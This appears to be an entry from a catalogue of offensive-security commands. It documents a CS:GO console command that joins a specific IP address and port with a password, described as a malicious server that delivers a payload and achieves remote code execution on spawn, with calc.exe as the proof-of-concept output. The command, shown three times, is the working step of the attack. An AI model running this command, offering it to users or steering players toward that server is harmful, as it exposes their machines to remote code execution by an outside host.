---
id: cmd-connect-malicious
data: 'connect 139.99.199.147:27015; password 2214'
tags:
  - client-connect
  - csgo
type: command
output: 'Client joins server; on spawn, calc.exe launches if exploit succeeds'
executor: csgo-client
platforms:
  - Windows
  - Gaming
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:24:08.889Z'
verified: false
validated: true
submitted: true
---
# connect-to-malicious-server

## Command

```bash
connect 139.99.199.147:27015; password 2214
```

## Description

This CS:GO client console command connects to a malicious server and provides the required password, triggering automatic payload delivery and RCE on spawn.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| IP:port | Server address and port | Yes |
| password | Server password | Yes |

## Examples

### Basic Usage

```bash
connect 139.99.199.147:27015; password 2214
```

## Expected Output

Client joins server; on spawn, calc.exe launches if exploit succeeds.

## Related

- [[commands/sv_allowuploads-1]]
